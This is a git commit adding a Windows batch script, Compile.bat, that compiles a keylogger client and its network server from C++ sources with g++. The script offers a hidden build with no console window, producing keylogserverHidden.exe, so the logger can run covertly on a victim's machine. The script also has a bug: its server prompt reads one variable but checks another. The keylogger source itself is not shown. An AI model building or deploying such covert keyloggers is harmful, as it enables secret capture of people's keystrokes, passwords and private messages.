25872d23a644651b8239d95feb4b151348ec60ae
Qu3b411 <19296119+Qu3b411@users.noreply.github.com>
2018-12-11 20:11:36 -0800

    compiler script

---
+++ Compile.bat
@@ -0,0 +1,30 @@
+@echo off
+
+:winprompt
+set /P windowd=Do you want to compile the keylogger with no window[Y/N]?
+if /I "%windowd%" EQU "Y" goto :option_nowindow
+if /I "%windowd%" EQU "N" goto :option_window
+goto :winprompt
+
+:option_window
+
+g++ .\KeyLoggerSoftware\client\KeyLogger_clientCom.cpp .\KeyLoggerSoftware\client\Sanitize_keylogBuff.cpp .\KeyLoggerSoftware\client\main.cpp -lws2_32 -o .\KeyLoggerSoftware\client\keylogserver.exe
+
+goto :ServerCompile
+:option_nowindow
+g++ .\KeyLoggerSoftware\client\KeyLogger_clientCom.cpp .\KeyLoggerSoftware\client\Sanitize_keylogBuff.cpp .\KeyLoggerSoftware\client\main.cpp -lws2_32 -mwindows -o .\KeyLoggerSoftware\client\keylogserverHidden.exe
+
+:ServerCompile
+echo complete
+:Server
+set /P Serv=Do you want to compile the keylogger Server at this time[Y/N]?
+if /I "%windowd%" EQU "Y" goto :ServerCompiler
+if /I "%windowd%" EQU "N" goto :exit
+goto :Server
+:ServerCompiler
+g++ .\KeyLoggerSoftware\Server\main.cpp -lws2_32 -o .\KeyLoggerSoftware\server\keylogserverServer.exe
+echo complete
+
+:exit
+
+pause
